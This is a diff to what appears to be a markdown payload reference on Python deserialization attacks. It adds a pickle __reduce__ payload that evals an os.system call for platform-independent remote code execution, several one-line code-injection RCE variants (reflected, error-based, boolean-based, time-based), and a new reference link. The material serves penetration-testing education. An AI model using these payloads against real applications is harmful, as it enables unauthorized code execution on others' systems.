@@ -68,6 +68,30 @@ evil_token = b64encode(cPickle.dumps(e))
 print("Your Evil Token : {}").format(evil_token)
 ```
 
+This payload uses platform-specific `os` module, so payloads generated on Windows will not work on Linux and vice versa.
+
+A universal payload can be created by loading `os` at runtime using eval:
+
+```python
+import pickle
+import base64
+
+class RCE:
+    def __reduce__(self):
+        return eval, ("__import__('os').system('whoami')",)
+pickled = pickle.dumps(RCE())
+print(base64.b64encode(pickled).decode())
+```
+
+This approach allows running arbitrary python code, which allows us to use different techniques from code injection:
+
+```python
+__import__('os').system('whoami') # Reflected RCE
+getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE
+1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
+__include__("os").popen("id && sleep 5").read() # Time-Based RCE
+```
+
 ### PyYAML
 
 YAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.
@@ -111,3 +135,4 @@ with open('exploit_unsafeloader.yml') as file:
 * [Python Yaml Deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
 * [PyYAML Documentation - PyYAML - April 29, 2006](https://pyyaml.org/wiki/PyYAMLDocumentation)
 * [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
+* [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
